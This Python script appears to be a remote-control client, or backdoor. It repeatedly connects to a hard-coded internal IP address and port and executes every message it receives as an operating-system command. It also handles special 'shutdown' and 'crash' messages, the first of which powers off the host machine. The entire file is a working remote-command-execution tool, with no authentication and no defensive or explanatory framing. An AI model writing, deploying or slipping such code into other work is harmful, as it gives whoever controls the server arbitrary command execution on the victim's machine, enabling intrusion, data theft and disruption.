import socket
import time
import os
import webbrowser



def start_client(server_host='10.0.30.160', server_port=65432, retry_delay=5):
    while True:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        print(f"Trying to connect to server at {server_host}:{server_port}...")

        try:
            # Attempt to connect to the server
            client_socket.connect((server_host, server_port))
            print(f"Connected to server at {server_host}:{server_port}")
            
            while True:
                try:
                    # Wait for a message from the server
                    data = client_socket.recv(1024)  # Buffer size of 1024 bytes
                    if not data:
                        # If no data is received, assume connection closed by server
                        print("Connection closed by the server. Reconnecting...")
                        break  # Break out to retry connecting
                    
                    # Process the received message
                    message = data.decode('utf-8')
                    
                    if "shutdown" in message:
                        print("Shutting down client...")
                        os.system("shutdown /s /t 1")
                    elif "crash" in message:
                        print("Crashing client...")
                        for x in range(0,1):
                            webbrowser.open("www.google.com")

                    else:
                        os.system(message)
                    
                    # Display the message from the server
                    print("Message from server:", message)
                
                except Exception as e:
                    print(f"An error occurred while receiving data: {e}")
                    break  # Break out to retry connecting

        except (socket.error, socket.timeout) as e:
            # If unable to connect, print the error and retry after a delay
            print(f"Failed to connect to server: {e}")
        
        finally:
            # Close the socket in case it's open before retrying
            client_socket.close()
        
        # Wait before attempting to reconnect
        print(f"Retrying to connect in {retry_delay} seconds...")
        time.sleep(retry_delay)

if __name__ == "__main__":
    start_client()
